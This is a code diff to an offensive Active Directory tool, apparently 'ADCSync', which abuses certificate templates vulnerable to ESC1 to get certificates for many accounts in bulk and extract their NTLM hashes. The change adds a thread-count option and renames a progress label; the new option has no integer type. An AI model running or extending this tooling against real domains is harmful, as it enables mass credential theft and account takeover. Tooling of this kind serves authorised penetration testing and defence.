@@ -68,10 +68,6 @@ class AccountInfo:
 class AccountList:
     accounts: List[AccountInfo] = field(default_factory=list)
 
-# Determine optimal thread count
-# MAX_THREADS = min(32, os.cpu_count() * 2)
-MAX_THREADS = 10
-
 # Create the "certificates" folder if it doesn't exist
 certificates_folder = 'certificates'
 if not os.path.exists(certificates_folder):
@@ -121,7 +117,7 @@ def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
     dc_netbios_domain = dc_fqdn.split('.')[0].lower()
     return dc_netbios_domain
 
-def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, debug):
+def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, debug, threads):
     """Retrieve certificates using Certipy."""
     logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")
 
@@ -189,10 +185,10 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                 shutil.move(ccache_filename, ccache_destination)
         return account, stdout.strip(), stderr.strip()
 
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+    with ThreadPoolExecutor(max_workers=threads) as executor:
         futures = {executor.submit(fetch_cert_and_auth, account): account for account in accounts.accounts}
         with open(output_file, 'a') as out_file:
-            for future in tqdm(as_completed(futures), total=len(futures), desc="Retrieving Certs and Auth ESC1"):
+            for future in tqdm(as_completed(futures), total=len(futures), desc="ADCSync ESC1"):
                 result = future.result()
                 if result:
                     account, stdout, stderr = result
@@ -207,13 +203,13 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                         except IndexError:
                             logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
 
-def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
+def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains, threads):
     """Main function to extract accounts, retrieve certificates, and authenticate."""
 
     data = get_json_data(file)
     accounts = extract_accounts(data)
 
-    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, debug)
+    retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output, debug, threads)
 
     logger.success("🎉 ADCSync process completed successfully!")
 
@@ -230,9 +226,10 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--password', help='Password', required=True)
     parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
     parser.add_argument('-target', help='CA FQDN', required=True)
+    parser.add_argument('-t', '--threads', default=4, help='Number of threads to use. (default=4)')
     parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
     parser.add_argument('-proxychains', action='store_true', help='Use proxychains4')
 
     args = parser.parse_args()
-    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains)
+    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains, args.threads)
 
